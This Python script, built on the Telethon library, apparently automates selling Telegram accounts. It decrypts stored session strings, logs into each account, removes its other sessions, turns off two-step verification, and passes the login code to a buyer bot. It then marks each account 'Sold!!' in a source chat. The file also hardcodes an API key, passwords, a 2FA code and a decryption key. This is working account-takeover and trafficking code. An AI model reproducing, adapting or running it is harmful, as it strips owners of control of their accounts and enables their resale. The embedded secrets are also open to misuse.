import time
import asyncio
from telethon.sync import TelegramClient, events, functions
from telethon.sessions import StringSession
import crypter

# ================= CONFIG =================
api_id = '16017675'
api_hash = '898e9db01786302c9f95f67c23d9fecb'
pswd = "khALid@542543"
pass_2fa = "542543"

TARGET_BOT = '@B172dhhsijsbwusi_bot'
SOURCE_CHAT = 2576914746

# ==========================================

mClient = TelegramClient('me', api_id, api_hash).start(password=pswd)


# ================= KILL OTHER SESSIONS =================
def kill_others(client):
    sessions = client(functions.account.GetAuthorizationsRequest())

    if len(sessions.authorizations) > 1:
        print("⚠️ Other sessions found, removing...")
        for s in sessions.authorizations:
            if s.hash > 0:
                client(functions.account.ResetAuthorizationRequest(hash=s.hash))
        return False
    return True


# ================= MAIN =================
ssn_for_sell = input("How many SSNs You Want to Sell? ")
all_ssns = []

for message in mClient.get_messages(SOURCE_CHAT, None):

    if (
        message.replies and
        hasattr(message.replies, 'replies') and
        message.replies.replies == 0 and
        message.message.startswith("880")
    ):

        num = message.text.split('\n\n')[0].replace("`", "")
        ssn = message.text.split('\n\n')[1].replace("`", "")

        if ssn.startswith("b'") and ssn.endswith("'"):
            ssn = ssn.replace("b'", "").replace("'", "")

        ssn = crypter.password_decrypt(ssn.encode(), 'KsP@542543').decode()
        all_ssns.append(ssn)

        # ================= LOGIN =================
        client = TelegramClient(StringSession(ssn), api_id, api_hash).start(password=pass_2fa)
        cPhn = client.get_me().phone

        print(f"✅ Logged in: {cPhn}")

        if not kill_others(client):
            print("❌ Skipping (multiple sessions)")
            continue

        # ================= FLAGS =================
        otp_sent = False
        login_detected = False

        # ================= BOT START =================
        mClient.send_message(TARGET_BOT, "📤 ارسال اکانت")
        print("📤 Order sent")

        # ================= BOT REPLY HANDLER =================
        @mClient.on(events.NewMessage(incoming=True, chats=TARGET_BOT))
        async def bot_handler(event):
            text = event.raw_text

            # Ask number
            if "لطفا شماره مجازی خود را" in text:
                print("📱 Sending number...")
                await mClient.send_message(TARGET_BOT, '+' + cPhn)

        # ================= OTP + LOGIN DETECT =================
        @client.on(events.NewMessage(incoming=True, chats=777000))
        async def otp_handler(event):
            global otp_sent, login_detected

            text = event.raw_text
            print("📩 777000:", text)

            # OTP detect
            if text.startswith("Login code:"):
                otp = text.replace("Login code: ", "").split('.')[0]
                print(f"🔑 OTP: {otp}")

                # ====== 🔥 2FA DISABLE BEFORE SENDING OTP ======
                try:
                    result = await client(functions.account.GetPasswordRequest())
                    if result.has_password:
                        print("🔐 2FA detected → disabling...")
                        await client.edit_2fa('542543')
                        print("✅ 2FA disabled")
                    else:
                        print("❌ No 2FA active")
                except Exception as e:
                    print(f"❌ 2FA error: {e}")
                # =============================================

                # OTP send AFTER 2FA off
                await mClient.send_message(TARGET_BOT, otp)
                otp_sent = True

            # New login detect
            if (
                "logged in" in text.lower() or
                "new login" in text.lower() or
                "successfully logged in" in text.lower()
            ):
                print("✅ New login detected")
                login_detected = True

            # 2FA detect
            if (
                "two-step verification" in text.lower() or
                "2-step verification" in text.lower() or
                "password changed" in text.lower()
            ):
                print("🔐 2FA activity detected")
                login_detected = True

            # FINAL CONDITION
            if otp_sent and login_detected:
                print("🚀 Done → Logging out")

                await client.log_out()
                await client.disconnect()

        # ================= RUN =================
        try:
            client.run_until_disconnected()
        except:
            pass

        # ================= MARK SOLD =================
        mClient.send_message(SOURCE_CHAT, 'Sold!!', reply_to=message.id)

        print(f"💰 {num} SOLD")
        print(f"📊 Total sold: {len(all_ssns)}")

        time.sleep(5)

        if str(len(all_ssns)) == ssn_for_sell:
            break

print("✅ All Done")
